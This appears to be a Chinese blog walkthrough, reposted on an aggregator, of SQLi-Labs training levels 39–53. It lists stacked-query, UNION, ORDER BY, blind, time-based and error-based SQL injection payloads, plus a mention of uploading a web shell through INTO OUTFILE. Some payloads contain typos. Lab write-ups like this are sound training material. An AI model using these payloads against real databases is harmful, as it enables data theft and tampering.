---
title: SQLi_Labs靶场之Stacked Injections学习分享
url: https://buaq.net/go-146420.html
source: unSafe.sh - 不安全
date: 2023-01-22
fetch_date: 2025-10-04T04:32:27.861012
---

# SQLi_Labs靶场之Stacked Injections学习分享

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/c1a0fcd41615799670457cb7fedc1ccf.jpg)

SQLi\_Labs靶场之Stacked Injections学习分享

Less-39堆叠注入，成功创建test39数据表1;create table test39 like users;%23删除test39数据表1;drop
*2023-1-21 15:23:53
Author: [xz.aliyun.com(查看原文)](/jump-146420.htm)
阅读量:34
收藏*

---

## **Less-39**

堆叠注入，成功创建test39数据表

1;create table test39 like users;%23

删除test39数据表

1;drop table test39;%23

再次查询就会有新建的表名

0 union select 1,group\_concat(table\_name),3 from information\_schema.tables where table\_schema=database() %23

![](https://img-blog.csdnimg.cn/79e96449136d41d0b97c845c5c72e8e8.png)

## **Less-40**

1');create table test40 like users;%23

再次查询就会有新建的表名

0') union select 1,group\_concat(table\_name),3 from information\_schema.tables where table\_schema=database() %23

![](https://img-blog.csdnimg.cn/8474182711d24181ab01f4bc1f70b343.png)

## **Less-41**

1;create table test41 like users;%23

再次查询就会有新建的表名

0 union select 1,group\_concat(table\_name),3 from information\_schema.tables where table\_schema=database() %23

![](https://img-blog.csdnimg.cn/3de3016a98e84af7b796238927a4e154.png)

## **Less-42**

password处无过滤

login\_user=1&login\_password=1'%3bcreate+table+test42+like+users%3b%23&mysubmit=Login

## **Less-43**

password处无过滤

login\_user=1&login\_password=1')%3bcreate+table+test43+like+users%3b%23&mysubmit=Login

## **Less-44**

login\_user=1&login\_password=1'%3bcreate+table+test44+like+users%3b%23&mysubmit=Login

## **Less-45**

login\_user=1&login\_password=1')%3bcreate+table+test45+like+users%3b%23&mysubmit=Login

## **Less-46**

**order by注入**

username、password均为列名，所以以下需要知道列名

?sort=if(1=1,username,password)

![](https://img-blog.csdnimg.cn/a140f4353e924dae8f2356112ecdb944.png)

?sort=null,if(1=1,username,password)

?sort=(case when (1=1) then username else password end)

?sort=ifnull(null, username)

?sort=rand(1=1) //order by rand(1)/rand(0)两者返回不一样

?sort=(select 1 regexp if(1=1,1,0x00))

将1=1换成bool盲注的语句函数即可用于获取数据

sort=rand(ascii(database(),1))=115)

**时间盲注**

sort=1 and if(ascii(substr(database(),1,1))=116,0,sleep(5))

sort=(select if(substring(current,1,1)=char(115),benchmatrk(5000000,md5('1')),null) from (select database() as current) as tb1)

**Bool 盲注**

rand(ascii(left(database()),1))=115)

**报错注入：**

1%20or%20updatexml(1,concat(0x7e,(select%20user())),1)

![](https://img-blog.csdnimg.cn/cf1c316d15d5451b84459851bc65cf89.png)

```
updatexml(1,if(1=1,concat(0x7e,version()),2),1) (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))
```

![](https://img-blog.csdnimg.cn/a3a6d22cedaa4c418bec9eb5bd31d9e1.png)

procedure analyse 参数后注入

sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)

![](https://img-blog.csdnimg.cn/2598abb69c3f4fc7a78e7987f263543d.png)

**into outfile参数:**

id=1 into outfield "path"

上传网马，可以在后面加上lines terminated by 16进制转码的数据

## **Less-47**

有'，可以用报错

1%27%20or%20updatexml(1,concat(0x7e,(select%20user())),1)%20--%20q

![](https://img-blog.csdnimg.cn/b852fceb6fe04e7db09bf807ce9af48b.png)

```
1'and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))--+

1'and (select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x)--+
```

也可以用时间盲注

1'and If(ascii(substr(database(),1,1))=115,0,sleep (5))--+

procedure analyse 参数后注入

1'procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)--+

![](https://img-blog.csdnimg.cn/d317adaaf2d741ff8597f39acaefa0c3.png)

## **Less-48**

1 and If(ascii(substr(database(),1,1))>115,0,sleep (5))--+

sort=rand(ascii(left(database(),1))=115)

![](https://img-blog.csdnimg.cn/b1084a5c871a40d4b861d2aca894b6f6.png)

## **Less-49**

1' and If(ascii(substr(database(),1,1))=115,0,sleep (5))--+

![](https://img-blog.csdnimg.cn/d68091be7e0e40448c99efcc6fc5acfd.png)

1' and (If(ascii(substr((select username from users where id=1),1,1))=68,0,sleep(5)))--+

## **Less-50**

堆叠注入

1;create table test50 like users;%23

## **Less-51**

1';create table test51 like users;%23

## **Less-52**

1;create table test52 like users;%23

## **Less-53**

1';create table test53 like users;%23

文笔生疏，措辞浅薄，望各位大佬不吝赐教，万分感谢。

免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。

转载声明：儒道易行 拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。

博客:

<https://rdyx0.github.io/>

先知社区：

<https://xz.aliyun.com/u/37846>

SecIN:

<https://www.sec-in.com/author/3097>

CSDN:

<https://blog.csdn.net/weixin_48899364?type=blog>

公众号：

<https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg5NTU2NjA1Mw==&action=getalbum&album_id=1696286248027357190&scene=173&from_msgid=2247485408&from_itemidx=1&count=3&nolastread=1#wechat_redirect>

FreeBuf：

<https://www.freebuf.com/author/%E5%9B%BD%E6%9C%8D%E6%9C%80%E5%BC%BA%E6%B8%97%E9%80%8F%E6%8E%8C%E6%8E%A7%E8%80%85>

文章来源: https://xz.aliyun.com/t/12060
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)